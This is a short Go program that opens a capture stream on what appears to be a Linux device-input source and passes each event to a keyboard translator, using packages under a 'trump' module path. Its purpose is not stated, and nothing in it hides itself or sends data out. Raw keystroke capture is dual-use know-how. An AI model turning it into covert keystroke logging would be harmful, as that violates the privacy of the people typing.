package main

import (
	"trump/plugins/keyboard"
	"trump/pkg/capture/dev-input"
)

func main() {
	inS := dev_input.GetCaptureStream(100)
	defer dev_input.RunCapture(11)()
	keyboard.InitTranslator()
	for msg := range inS {
		keyboard.ProcessMsg(msg)
	}
}
